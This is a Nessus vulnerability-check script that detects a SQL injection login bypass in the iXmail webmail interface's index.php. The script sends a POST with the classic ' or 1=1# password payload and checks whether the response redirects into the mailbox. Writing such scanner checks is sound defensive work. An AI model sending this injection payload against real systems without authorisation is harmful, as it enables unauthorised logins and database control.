#
# (C) Tenable Network Security
#

if(description)
{
 script_id(11782);
 script_bugtraq_id(8047);
 script_version ("$Revision: 1.8 $");

 
 name["english"] = "iXmail SQL injection";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running the iXmail webmail interface.

There is a flaw in this interface which allows an attacker 
to log in as any user by using a SQL injection flaw in the
code of index.php.

An attacker may use this flaw to gain unauthorized access on
this host, or to gain the control of the remote database.

Solution : Upgrade to iXMail 0.4
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for iXMail";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port)) exit(0);
if(!can_host_php(port:port)) exit(0);

foreach dir ( cgi_dirs() )
{
 data = "username=nessus&password=%27+or+1%3D1%23&login=Login";
 
 req = http_post(item:dir + "/index.php", port:port);
 idx = stridx(req, '\r\n\r\n');
 req = insstr(req, '\r\nContent-Length: ' + strlen(data) + '\r\n' + 
 'Content-Type: application/x-www-form-urlencoded\r\n\r\n' + data, idx);
 
 
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if(egrep(pattern:"^Location: ixmail_box\.php", string:res))
 {
  security_hole(port);
 }
}
